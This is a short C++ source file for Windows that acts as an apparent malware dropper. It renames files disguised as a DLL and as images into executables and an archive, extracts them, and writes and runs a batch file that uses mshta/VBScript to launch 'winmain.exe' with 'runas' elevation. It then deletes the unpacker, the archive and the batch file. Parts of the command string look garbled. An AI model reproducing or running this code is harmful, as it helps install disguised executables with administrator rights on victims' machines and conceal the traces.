#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
char path[1000000];
string _path, runas = "%1 mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"winmain.exe\",\"/c %~s0 ::\",\"\",\"runas\",1)(window.close) && del unrar.exe archive.rar run.bat /f /s /q";
int p, len;
int main() {
	system("chcp 65001");
	GetModuleFileName(NULL, path, sizeof(path));
	len = strlen(path);
	for (int i = len - 1; i >= 0; i--) {
		if (path[i] == '\\') {
			p = i;
			break;
		}
	}
	_path = path;
	_path.erase(p + 1);
	system(("cd " + _path).c_str());
	system("rename install.dll unrar.exe");
	system("rename image.jpg archive.rar");
	system("unrar.exe x archive.rar ./");
	system("rename a.jpg winmain.exe");
	system("rename b.png wincopy.exe");
	freopen("run.bat", "w", stdout);
	printf("%s", runas.c_str());
	fclose(stdout);
	system("run.bat");
	return 0;
}
